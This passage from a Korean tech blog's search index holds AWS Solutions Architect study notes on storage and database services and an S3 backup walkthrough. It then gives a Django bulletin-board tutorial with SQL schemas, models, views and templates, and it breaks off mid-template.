ETL을 통해 뽑아낸 데이터를 DW에 적재하고, BI를 이용하여 분석하는 기본 과정을 거침   Redshift vs RDS  Redshift는 보고 및 분석에 사용되지만, RDS는 OLTP(온라인 트랜잭션) 워크로드에 사용 Redshfit는 대용량 데이터 세트를 대상을 복합적인 분석 쿼리를 빠르게 실행하는 것에 목표를, RDS는 단일 행 트랜잭션에 목표를 둠    Amazon Aurora  클라우드에서 데이터베이스를 처음부터 설계하자는 생각에서 출발한 DB 서비스 MySQL과 PostgreSQl과 호환이 가능 각 AZ마다 2개의 데이터 복사본을 자동으로 유지하며, 에러를 스스로 찾아내고 복구 Read Replica는 다른 DB 서비스와 달리 최대 15개 까지 가능하며, 백업과 스냅샷이 퍼포먼스에 영향을 주지 않음    "}),a.add({id:71,href:'/docs/aws/awssaa/',title:"AWS SAA 시험정리",content:"Amazon Web Service Certified Solutions Architect AWS SAA의 개요  1장 AWS의 핵심 서비스 2장 EC2와 EBS 3장 S3와 Glacier 4장 VPC 5장 데이터베이스 6장 인증과 권한 7장 AWS 관리도구 8장 DNS와 네트워크 라우팅 9장 안전성 핵심요소 10장 성능 효율성 핵심요소 11장 보안 핵심요소 12장 비용 최적화 핵심요소 13장 운영 우수성 핵심요소 14장 평가문제 정리 15장 기출문제 정리    "}),a.add({id:72,href:'/docs/aws/amazonwebservice/aws_storage/',title:"AWS Storage",content:"AWS Storage   S3 ( Simple Storage Service )    웹 서비스 인터페이스( HTTP ) 를 이용하여 웹에서 언제 어디서나 원하는 양의 데이터를 저장하고 검색할 수 있는 스토리지 버킷( Bucket )과 객체 ( Object )로 나뉘며, 저장하고자 하는 모든 요소는 하나의 객체로 저장되고, 객체를 담는 곳이 버킷 S3 자체는 글로벌 서비스이지만 버킷을 생성 할 때에는 리전을 선택해야 함 객체는 객체 데이터와 메타 데이터로 나뉘며, 각자의 고유한 URL을 가지며 해당 URL로 접속 가능   버킷( Bucket )의 정의와 특징  객체를 담고 있는 구성 요소 크기는 무제한, 리전을 지정하여 버킷을 생성해야 함 버킷의 이름은 반드시 고유해야하며, 증복이 불가능 한번 설정된 버킷의 이름은 다른 계정에서 사용불가   객체( Object ) 의 정의와 특징  S3에 업로드되는 1개의 데이터를 객체라 함 키, 버전 ID, 값, 메타데이터 등으로 구성 객체 하나의 최소 크기는 1(0) byte ~ 5TB 스토리지 클래스, 암호화, 태그, 메타데이터, 객체 잠금 설정 가능 객체의 크기가 매우 클 경우 멀티파트 업로드를 통해 신속하게 업로드 가능   객체의 스토리지 클래스  객체의 접근빈도 및 저장기안에 따라 결정되는 객체의 특성 Standard Type : 클래스를 선택하지 않을 경우 선택되는 일반적인 클래스 Strandard_IA(Ifrequent Access ) : 자주 엑세스하지는 않지만 즉시 액세스할 수 있는 데이터여야하는 경우 선택되는 클래스 One Zone_iA : Standard_IA와 기능은 동일하나 Standard_IA의 경우 세 곳의 AZ에 저장되는 것과 달리 한 군데의 AZ에만 저장되어 해당 AZ가 파괴될 경우 정보 손실 가능성 존재 ( 저장 요금이 적음 ) Intelligent tiering : 엑세스 빈도가 불규칙하여 빈도를 가늠하기 어려운 경우 선택되는 클래스 Glancier : 검색이 아닌 저장이 주용도인 스토리지로 저장요금이 위 클래스들보다 훨씬 저렴한, 다만 저장이 주용도이기 때문에 검색이 3~ 5시간이 소요 Glacier Deep Archive : 10년 이상 저장할 데이터를 저장하는 스토리지 클래스   S3 사용  \rS3 생성\r↕\r\r S3 생성 1. S3를 선택합니다.  2. S3 사용을 위해 버킷을 생성합니다.  버킷 생성이 주의사항  버킷 이름에 대문자사용이 불가능 버킷 이름에 특수문자 사용 불가능 버킷 이름이 중첩될 수 없음 퍼블릭 엑세스 차단을 위한 버킷설정  S3 사용자의 설정에 따라 엑세스를 차단\u0026amp; 허용 설정이 가능     3. Bucket의 생성되었습니다.  4. 버킷을 선택하면 버킷을 사용할 수 있습니다.  5. 버킷의 파일을 사용자의 옵션에 맞춰 업로드합니다.  6. 업로드가 완료되었습니다.  7. 업로드 파일을 선택하면, 퍼블릭 전환, 다운로드 링크 등의 기능을 사용가능합니다.  8. 권한이 없는 사용자가 링크로 접근하면 다음과 같은 오류가 발생됩니다.   \r\r\r  윈도우 예약 작업과 S3 활용  \r윈도우 예약 작업과 S3 활용\r↕\r\r 윈도우 S3 연동  1. 연동을 위해 Bucket의 backup 폴더를 생성합니다.  2. 계정 생성을 위해 IAM 서비스로 이동합니다.  IAM이란   3. 사용자 추가를 선택하여 사용자의 옵션에 맞춰 새로운 사용자를 생성합니다.  4. 사용자 생성이 완료되었습니다. 사용자 생성 후, 연동을 위해 CLI를 설치합니다.  5. 설치가 완료되면, cmd 창에서 configure를 입력 후, 다운받은 csv파일의 정보들을 입력합니다.  AWS Access Key ID : ex.csv 파일의 엑세스 ID 값 AWS Secret Access Key :ex.csv 파일의 보안 엑세스 키 값 Default region name : region 이름으로 ap-northeast-2 입력 Default output format : 포맷 형식으로 json을 입력   6. aws s3 sync [ 저장한 윈도우의 경로 ] s3 [ 저장될 버킷의 경로 ]를 입력합니다. aws s3 sync c:\\backup s3://mybucketbucket/backup  7. 자동화를 위해 .bat 파일을 생성합니다.  8. bat 파일을 작업 스케줄러에 등록합니다.     9. 등록이 완료되었습니다. 확인을 위해 실행을 클릭합니다.  \r\r\r   Amazon EFS ( Elastic File System )    AWS 클라우드 서비스와 온프레미스 리소스에서 사용할 수 있는 탄력적인 완전 관리형 탄력적 NFS 파일 시스템 애플리케이션을 중단하지 않고 온디맨드 방식으로 구성 파일의 추가/ 제거 함에 따라 자동적으로 용량의 확장 및 축소 데이터 일관성 및 보안체계 제공 네트워크 파일 시스템( NFS v4 )를 사용하는 파일 스토리지 서비스 VPC 내에서 생성되며, 파일 시스템 인터페이스를 통해 EC2에 엑세스 수천 개의 EC2에서 동시에 엑세스 가능하며, 탄력적으로 파일을 추가하고 삭제함에 따라 자동으로 Auto Scaling 가능, 즉 미리 크기를 프로비저닝 할 필요가 없음 페타바이트단위 데이터까지 확장 가능 최대 1천개의 파일 시스템 생성   스토리지 클래스  Standard Class : 자주 액세스하는 파일을 저장하는 데 사용하는 클래스 Infrequent Access( IA ) Class : 저장기간이 길지만 자주 액세스하지 않는 파일을 저장하기 위한 클라스   가용성  여러 가용영역에서 엑세스 가능 여러 가용영역에 중복 저장되기 때문에 하나의 가용영역이 파괴되더라도 다른 AZ에서 서비스 제공 가능 IPSEC VPN 또는 Direct Connect를 통해 On-premise에서 접속 가능   성능 모드/ 처리량 모드  성능 모드에 있어서 대부분의 파일시스템에 Bursting Mode를 권장하지만 처리량이 많을 경우, Provisioned Mode를 권장   수명 주기 관리  Standard Class: 자주 액세스하는 클래스   파일시스템 정책  여러 가용영역에서 엑세스 가능 여러 가용영역에 중복 저장되기 때문에 하나의    Amazon Glacier    Glacier는 자주 사용하지 않는 데이터로 \u0026ldquo;Cold Data\u0026quot;에 최적화된 스토리지 서비스 데이터 보관 및 백업을 목적으로 보안 기능과 함께 내구성 있는 저장 공간을 제공하는 매우 저렴한 스토리지 서비스   Glacier의 종류  아카이브  Glacler에 데이터가 저장되는 최소 단위, 하나의 파일   볼트  Glacler에 생성할 수 있는 최상위 디렉토리, 볼트는 리전별로 생성해야 하며, 각 리전별로 최대 1000개까지 가능   볼트 인벤토리  볼트에 저장된 아카이브의 목록과 크기, 생성 날짜 등 아카이브 정보, 24시간에 한 번씩 업데이트      Storage Gateway    On-premise 환경에서 Cloud 상의 Storage를 지원할 수 있게 하는 하이브리드 스토리지 이름이 Storage ‘Gateway’인 이유는 Storage Gateway 자체가 스토리지의 역할을 하는 것이 아닌 스토리지( S3 )의 Gateway 역할을 하기 때문 Volume Gateway의 Stored Volume을 제외하고 나머지 유형은 EC2를 Gateway로 활용하여 Mount Point로 활용 가능 모든 Storage Gateway는 말 그대로 ‘Gateway‘를 생성해야 함  그 대상은 EC2 혹은 하드웨어 어플라이언스가 해당될 수 있음 EC2의 공인 IP를 Mount point로 지정하여 외부 네트워크에서 연결 가능   일반 PC에 마운트하여 사용하는 둥, 다양한 용도로 사용 가능   File Gateway  FNFS와 SMB를 지원하는 Storage Gateway 유형 S3를 스토리지로 사용하며, Gateway( EC2 등 )을 통해 S3에 데이터를 저장하고 이를 직접 S3에서 엑세스 할 수 있음 하나의 파일을 하나의 오브젝트로 관리됨 S3에 오브젝트로 관리되는 만큼, S3의 다른 기능을 사용할 수 있음   Volume Gateway  iSCSI를 지원하는 Storage Gateway 유형 두 가지 유형으로 나뉨  Cached Volume: S3를 기본 데이터 스토리로 사용하되, 자주 엑세스하는 데이터를 온프레미스 스토리지 게이트웨이의 캐시 및 업로드 버퍼 스토리지에 보관 Stored Volume: On-premise 스토리지를 기본 데이터 스토리지로 사용하고, 해당 데이터를 EBS Snapshot 형식으로 S3에 비동기 백업을 실시     Tape Gateway  VTL ( Vitual tape Library )를 지원하는 Storage Gateway 가상 테이프데이터는 S3나 S3 Glacier에 저장될 수 있음    EBS ( Elastic Block Stroe )    EBS 지원 EC2가 갖는 블록 형태의 스토리지 애플리케이션의 기본 스토리지로 쓰거나 시스템 드라이브용으로 쓰기 적합 인스턴스 생성 시 루트 디바이스 볼륨이 생성되며 사용 중에는 언마운트할 수 없음, 추가로 여러 볼륨의 마운트가 가능하며, 추가볼륨에 대해서는 사용중이라도 마운트/ 언마운트가 가능 EBS를 특정 AZ에서 생성하더라도 다른 AZ의 인스턴스에 즉시 붙일 수 있음 인스턴스 스토어 볼륨과는 달리 EBS 기반 인스턴스는 중지 / 재시작이 가능 사용중인 EBS더라도 볼륨 유형과 사이즈를 변경할 수 있음( 사이즈의 축소는 불가 )   EBS의 볼륨 유형  범용 SSD( gp2 ): 시스템 부트 사용 가능, 대부분의 워크로드에서 사용 프로비져닝된 IOPS SSD( io1 ): 지속적인 IOPS 성능이나 16.000 IOPS 이상의 볼륨당 처리량을 필요로 하는 경우 적합 ( DB 워크로드 ) 처리량 최적회돤 HDD( st1 ): 시스템 부트 사용 불가능, IOPS가 아닌 처리량을 기준으로 하며 자주 엑세스하는 워크로드에 적합한 저비용 HDD 볼륨, 빅데이터나 데이터 웨어 하우스에 사용 Cold HDD( sc1 ): 시스템 부트 사용 불가능, 자주 엑세스하지 않는 대용량 데이터 처리에 적합, 스토리지 비용이 최대한 낮아야 할 경우 사용   "}),a.add({id:73,href:'/docs/development/web/django/test/',title:"Django DB(model) create",content:"Django Project   Django Boardapp project  모델을 구성하기에 앞서 django에서 지원하는 admin을 사용하기 위해 기본적인 database를 받아온다.\n(ve) $ ./manage.py migrate  DB 테이블 생성\n# User table ALTER TABLE auth_user ADD COLUMN phone VARCHAR(45) NOT NULL AFTER date_joined, ADD COLUMN date_of_birth DATETIME NOT NULL AFTER phone, CHANGE COLUMN date_joined date_joined DATETIME NOT NULL AFTER email, CHANGE COLUMN first_name first_name VARCHAR(30) NULL AFTER is_active, CHANGE COLUMN is_staff is_staff TINYINT(1) NULL, CHANGE COLUMN is_active is_active TINYINT(1) NULL; # Board table ## board_categories create table board_categories( id int(10) not null auto_increment, category_type varchar(45) not null default \u0026#39;Normal\u0026#39;, category_code varchar(100) not null, category_name varchar(100) not null, category_desc varchar(200) not null, list_count int(10) default \u0026#39;20\u0026#39;, authority int(1) default \u0026#39;0\u0026#39;, creation_date datetime default current_timestamp, last_update_date datetime default null, primary key(id) )engine=InnoDB default CHARSET=utf8; ## boards create table boards( id int(10) not null auto_increment, category_id int(10) not null, user_id int(10) not null, title varchar(300) not null, content text not null, registered_date datetime default current_timestamp, last_update_date datetime default null, view_count int(10) default \u0026#39;0\u0026#39;, image varchar(255) default null, primary key(id), key board_category_fk_idx(category_id), key board_user_fk_idx(user_id), constraint board_category_fk foreign key(category_id) references board_categories(id) on delete no action on update no action, constraint board_user_fk foreign key(user_id) references auth_user(id) on delete no action on update no action )engine=InnoDB default CHARSET=utf8; ## board_replies create table board_replies( id int(10) not null auto_increment, article_id int(10) not null, user_id int(10) not null, `level` tinyint(1) default \u0026#39;1\u0026#39;, content text not null, reference_reply_id int(10) default \u0026#39;0\u0026#39;, registered_date datetime default current_timestamp, last_update_date datetime default null, primary key(id), key user_reply_fk_idx(user_id), key article_reply_fk_idx(article_id), constraint article_reply_fk foreign key(article_id) references boards(id) on delete no action on update no action, constraint user_reply_fk foreign key(user_id) references auth_user(id) on delete no action on update no action )engine=InnoDB default CHARSET=utf8; ## board_likes create table board_likes( id int(10) not null auto_increment, article_id int(10) not null, user_id int(11) not null, registered_date datetime default current_timestamp, primary key(id), key like_article_fk_idx(article_id), key like_user_fk_idx(user_id), constraint like_article_fk foreign key(article_id) references boards(id) on delete no action on update no action, constraint like_user_fk foreign key(user_id) references auth_user(id) on delete no action on update no action )engine=InnoDB default CHARSET=utf8; pip3 install Pillow\n어플리케이션 생성 및 settings.py 수정\n(ve) $ ./manage.py startapp boardapp (ve) $ vi Django/setting.py INSTALLE_APPS에 생성한 어플리케이션을 등록한다.\nINSTALLED_APPS = [ ... ... \u0026#39;django.contrib.messages\u0026#39;, \u0026#39;django.contrib.staticfiles\u0026#39;, \u0026#39;boardapp.apps.BoardappConfig\u0026#39;, ] AUTH_USER_MODEL = \u0026lsquo;boardapp.user\u0026rsquo;\n   MTV 패턴 Models 구성   models   boardapp에서 사용할 table을 만들었으니 model에 추가 기본적인 틀 생성을 위해 inspectdb를 사용  (ve) $ ./manage.py inspectdb \u0026gt; boardapp/models.py  받아온 모델을 앞으로 사용할 모델에 적합하게 수정  from django.contrib.auth.models import AbstractBaseUser,BaseUserManager,PermissionsMixin from django.db import models from django.utils import timezone class UserManager(BaseUserManager): def create_user(self, username, password, last_name, email, phone, date_of_birth): user = self.model( username=username, last_name=last_name, email=self.normalize_email(email), phone=phone, date_of_birth=date_of_birth, date_joined=timezone.now(), is_superuser=0, is_staff=0, is_active=1 ) user.set_password(password) user.save(using=self._db) return user def create_superuser(self, username, last_name, email, phone, date_of_birth, password): user = self.create_user( username=username, password=password, last_name=last_name, email=email, phone=phone, date_of_birth=date_of_birth ) user.is_superuser = 1 user.is_staff = 1 user.save(using=self._db) return user class User(AbstractBaseUser, PermissionsMixin): password = models.CharField(max_length=128) username = models.CharField(unique=True, max_length=150) is_superuser = models.IntegerField() last_name = models.CharField(max_length=150) phone = models.CharField(max_length=45) email = models.CharField(max_length=254) date_of_birth = models.DateTimeField() date_joined = models.DateTimeField() last_login = models.DateTimeField(blank=True, null=True) is_staff = models.IntegerField(blank=True, null=True) is_active = models.IntegerField(blank=True, null=True) first_name = models.CharField(max_length=30, blank=True, null=True) objects = UserManager() USERNAME_FIELD = \u0026#39;username\u0026#39; REQUIRED_FIELD = [\u0026#39;last_name\u0026#39;, \u0026#39;phone\u0026#39;, \u0026#39;email\u0026#39;, \u0026#39;date_of_birth\u0026#39;] def has_perm(self, perm, obj=None): return True def has_module_perms(self, app_lable): return True class Meta: db_table = \u0026#39;auth_user\u0026#39; class BoardCategories(models.Model): category_type = models.CharField(max_length=45) category_code = models.CharField(max_length=100) category_name = models.CharField(max_length=100) category_desc = models.CharField(max_length=200) list_count = models.IntegerField(blank=True, null=True) authority = models.IntegerField(blank=True, null=True) creation_date = models.DateTimeField(default=timezone.now) last_update_date = models.DateTimeField(default=timezone.now) def __str__(self): return \u0026#39;%s(%s)\u0026#39; % (self.category_name, self.category_code) class Meta: managed = False db_table = \u0026#39;board_categories\u0026#39; class Boards(models.Model): category = models.ForeignKey(BoardCategories, models.DO_NOTHING) user = models.ForeignKey(User, models.DO_NOTHING) title = models.CharField(max_length=300) content = models.TextField() registered_date = models.DateTimeField(default=timezone.now) last_update_date = models.DateTimeField(default=timezone.now) view_count = models.IntegerField(blank=True, default=0) image = models.ImageField(upload_to=\u0026#34;images/%Y/%m/%d\u0026#34;, blank=True) def __str__(self): return \u0026#39;[%d] %.40s\u0026#39; % (self.id, self.title) class Meta: managed = False db_table = \u0026#39;boards\u0026#39; class BoardReplies(models.Model): article = models.ForeignKey(Boards, models.DO_NOTHING) user = models.ForeignKey(User, models.DO_NOTHING) level = models.IntegerField(blank=True, null=True) content = models.TextField() reference_reply_id = models.IntegerField(blank=True, null=True) registered_date = models.DateTimeField(default=timezone.now) last_update_date = models.DateTimeField(default=timezone.now) def __str__(self): return \u0026#39;[%d] %.40s- [%d] %.40s\u0026#39; % (self.article.id, self.article.title, self.id, self.content) class Meta: managed = False db_table = \u0026#39;board_replies\u0026#39; class BoardLikes(models.Model): article = models.ForeignKey(Boards, models.DO_NOTHING) user = models.ForeignKey(User, models.DO_NOTHING) registered_date = models.DateTimeField(default=timezone.now) def __str__(self): return \u0026#39;[%d] %.40s- %s\u0026#39; % (self.article.id, self.article.title, self.user.last_name) class Meta: managed = False db_table = \u0026#39;board_likes\u0026#39;   Djnago 어플리케이션 흐름  urls.py에 등록되어 있는 url을 따라간다. urls.py에 특정 url에 접근 했을 때 동작할 행동을 지정 지정한 동작을 views.py에 def, class로 만들어 행동을 이행 필요하다면 models.py에 접근하여 만들어 놓은 모델을 사용  urls.py 작성\nfrom django.conf.urls.static import static from django.conf import settings from django.contrib import admin from django.urls import include, path urlpatterns = [ path(\u0026#39;admin/\u0026#39;, admin.site.urls), path(\u0026#39;boardapp/\u0026#39;, include(\u0026#39;boardapp.urls\u0026#39;)), ] urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)  boardapp/urls.py\nfrom django.conf.urls.static import static from django.conf import settings from django.urls import path from django.contrib.auth import views as auth_views from boardapp.views import * urlpatterns = [ path(\u0026#39;\u0026#39;, main_page, name=\u0026#39;main\u0026#39;), ] urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) boardapp/views.py에 앞으로 사용될 모듈을 모두 import 시켜둔다\nfrom django.shortcuts import render, redirect from django.http import HttpResponse, HttpResponseRedirect, JsonResponse from boardapp.models import * from datetime import datetime from django.utils import timezone import math from django.db.models import Count from django.core.paginator import Paginator from django.contrib.auth.decorators import login_required from django.views.generic import DetailView def main_page(request): return HttpResponse(\u0026#34;\u0026lt;h2\u0026gt;hi\u0026lt;/h2\u0026gt;\u0026#34;) hi 라는 문자가 확인이 가능해진다\ntemplate를 사용하여 Page를 보이게 한다\n$ vi boardapp/views.py def main_page(request): return render(request, \u0026#39;main.html\u0026#39;) admin 페이지에 djnago 에서 지원하는 페이지를 상속받아 사용\nvi boardapp/admin.py from django.contrib import admin from boardapp.models import * admin.site.register(Boards) admin.site.register(BoardCategories) admin.site.register(BoardReplies) admin.site.register(BoardLikes) static, media 지정\n각각의 파일의 위치를 settings.py에서 지정\nSTATIC_URL = \u0026#39;/static/\u0026#39; STATIC_ROOT = os.path.join(BASE_DIR, \u0026#39;static\u0026#39;) MEDIA_URL = \u0026#39;/media/\u0026#39; MEDIA_ROOT = os.path.join(BASE_DIR, \u0026#39;media\u0026#39;).replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;) 흩어져있는 static 파일을 지정한 URL로 복사한다.\n(ve) $ ./manage.py collectstatic runserver 확인\nboard/templates 디렉토리를 생성\nmain.html을 생성\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;타이틀\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;template로 작성되었습니다.\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 확인\n마이그레이트 boardapp\n\u0026ndash;\u0026gt; 마이그레이트\n 거의 모든 templates의 틀이 되는 base.html 생성  base.html main 페이지 작성 vi boardapp/templates/base.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;KO\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;{% block title %}AWS / Django Web Application{% endblock %}\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; {% load static %} \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{% static \u0026#39;boardapp/assets/css/bootstrap.min.css\u0026#39; %}\u0026#34;/\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{% static \u0026#39;boardapp/assets/css/main.css\u0026#39; %}\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/jquery-3.3.1.min.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/bootstrap.min.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {% block script %}{% endblock %} \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row bg-dark\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-8 logo-link dark-link\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{% url \u0026#39;main\u0026#39; %}\u0026#34;\u0026gt;AWS / Django Web Application\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-4 center member-link dark-link bg-black\u0026#34;\u0026gt; {% if user.username %} \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;{{ user.last_name }} 님\u0026lt;/a\u0026gt; / \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;로그아웃\u0026lt;/a\u0026gt; {% else %} \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;로그인\u0026lt;/a\u0026gt; / \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;회원가입\u0026lt;/a\u0026gt; {% endif %} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;menu\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row bg-dark\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{% url \u0026#39;main\u0026#39; %}\u0026#34;\u0026gt;HOME\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;소개\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;공지사항\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;자유 게시판\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;대화형 게시판\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-2 center sideline\u0026#34;\u0026gt;\u0026amp;nbsp;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;container\u0026#34;\u0026gt; {% block content %}{% endblock %} \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;footer\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row bg-dark\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 center\u0026#34; style=\u0026#34;color:white\u0026#34;\u0026gt;Copyright by Digitalbooks / \u0026lt;a href=\u0026#34;mailto:mail\u0026#34;\u0026gt;Contact Us\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; urls.py에 등록되지 않은 url은 \u0026lsquo;#\u0026lsquo;으로 변경\nurl을 추가할 때 마다 원래의 base.html을 업데이트 해 준다\n  main page\n vi boardapp/urls.py from django.conf.urls.static import static from django.conf import settings from django.urls import path from django.contrib.auth import views as auth_views from boardapp.views import * urlpatterns = [ path(\u0026#39;\u0026#39;, main_page, name=\u0026#39;main\u0026#39;), ] urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) vi boardapp/view.py from django.shortcuts import render, redirect from django.http import HttpResponse, HttpResponseRedirect, JsonResponse from boardapp.models import * from datetime import datetime from django.utils import timezone import math from django.db.models import Count from django.core.paginator import Paginator from django.contrib.auth.decorators import login_required from django.views.generic import DetailView def main_page(request): return render(request, \u0026#39;main.html\u0026#39;) vi boardapp/templates/main.html {% extends \u0026#34;base.html\u0026#34; %} {% block title %} Main {% endblock %} {% block script %} {% endblock %} {% block content %} \u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Welcome to AWS Django Board!\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endblock %}  boardapp/urls.py  # urlpatterns에 추가한다. path(\u0026#39;login/\u0026#39;, auth_views.LoginView.as_view(template_name=\u0026#39;login.html\u0026#39;), name=\u0026#39;login\u0026#39;), path(\u0026#39;logout/\u0026#39;, auth_views.LogoutView.as_view(), name=\u0026#39;logout\u0026#39;), path(\u0026#39;password_change/\u0026#39;, auth_views.PasswordChangeView.as_view(template_name=\u0026#39;password_change.html\u0026#39;), name=\u0026#39;password_change\u0026#39;), path(\u0026#39;password_change_done/\u0026#39;, auth_views.PasswordChangeDoneView.as_view(template_name=\u0026#39;password_change_done.html\u0026#39;), name=\u0026#39;password_change_done\u0026#39;), path(\u0026#39;user_register/\u0026#39;, user_register_page, name=\u0026#39;register\u0026#39;), path(\u0026#39;user_register_idcheck/\u0026#39;, user_register_idcheck, name=\u0026#39;registeridcheck\u0026#39;), path(\u0026#39;user_register_res/\u0026#39;, user_register_result, name=\u0026#39;registerres\u0026#39;), path(\u0026#39;user_register_completed/\u0026#39;, user_register_completed, name=\u0026#39;registercompleted\u0026#39;), user_register  boardapp/views.py  {% extends \u0026#34;base.html\u0026#34; %} {% block title %}회원가입{% endblock %} {% block script %} {% load static %}\u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/user.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {% endblock %} {% block content %} \u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-box col-6\u0026#34;\u0026gt; \u0026lt;form id=\u0026#34;register_form\u0026#34; action=\u0026#34;/boardapp/user_register_res/\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; {% csrf_token %} \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;phone\u0026#34; id=\u0026#34;phone\u0026#34; value=\u0026#34;\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; id=\u0026#34;email\u0026#34; value=\u0026#34;\u0026#34;/\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12\u0026#34;\u0026gt;\u0026lt;h2\u0026gt;회원가입\u0026lt;/h2\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; ID: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;중복확인\u0026#34; onclick=\u0026#34;idCheck()\u0026#34;/\u0026gt; \u0026lt;span id=\u0026#34;idcheck-result\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; Password: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;span style=\u0026#34;font-size: 0.7em\u0026#34;\u0026gt; * 비밀번호는 8글자 이상 입력해 주셔야 합니다. \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt; Password 확인: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password_check\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 